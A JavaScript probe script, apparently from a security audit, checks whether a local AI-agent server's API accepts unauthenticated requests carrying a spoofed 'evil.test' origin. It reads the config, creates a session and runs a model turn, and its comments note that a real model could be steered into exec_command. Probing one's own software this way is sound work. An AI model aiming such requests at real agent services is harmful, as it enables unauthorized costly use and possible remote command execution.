/**
 * 探针 AC：无令牌能不能通过会话接口触发一次真实模型调用（= 花钱）？
 *
 * 用项目自带的本地 test 模型（provider=test、modelId=test模型），它不请求外网，
 * 所以不需要任何真实凭据，但走的是与真实模型完全相同的执行链路。
 *
 * test 模型不支持 tool_calls（源码里没有），所以这条探针只验证「无鉴权能跑一轮」，
 * 不验证「模型会去调 exec_command」——后者需要真实模型，文中已标注。
 */
import http from 'node:http'

const BASE = process.env.BASE ?? 'http://127.0.0.1:8947'
const ORIGIN = 'http://evil.test:9999'

function req(path, method, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(BASE + path)
    const r = http.request({
      host: u.hostname, port: u.port, path: u.pathname, method,
      headers: { origin: ORIGIN, 'content-type': 'application/json', ...headers },
    }, (res) => {
      let b = ''
      res.on('data', (d) => { b += d })
      res.on('end', () => resolve({ status: res.statusCode, body: b }))
    })
    r.on('error', reject)
    if (body !== undefined) r.write(body)
    r.end()
  })
}

console.log('1) 看配置里有哪些模型（GET 不需要令牌）')
const cfg = await req('/api/agent/config', 'GET')
let models = []
try { models = JSON.parse(cfg.body).models ?? [] } catch {}
console.log('   status', cfg.status, '模型:', models.map((m) => m.provider + '/' + m.modelId).join(', '))

const testModel = models.find((m) => m.modelId === 'test模型')
if (!testModel) {
  console.log('   ⚠️ 没有 test模型，后面的步骤会失败（换个数据目录重来）')
}

console.log('\n2) 无令牌建会话')
const created = await req('/api/agent/canvases/default/sessions', 'POST', JSON.stringify({
  provider: testModel?.provider ?? 'test',
  modelId: testModel?.modelId ?? 'test模型',
  title: 'probe',
}))
console.log('   status', created.status, created.body.slice(0, 160))

let sid = ''
try { sid = JSON.parse(created.body).session?.id ?? JSON.parse(created.body).id ?? '' } catch {}
console.log('   sessionId:', sid || '(没拿到)')

if (sid) {
  console.log('\n3) 无令牌发一条消息（会真的跑一轮模型）')
  const sent = await req(`/api/agent/canvases/default/sessions/${sid}/messages`, 'POST', JSON.stringify({
    text: '你好，这一轮是被跨源页面触发的。',
    stream: false,
  }))
  console.log('   status', sent.status)
  console.log('   body:', sent.body.slice(0, 400).replace(/\s+/g, ' '))
}
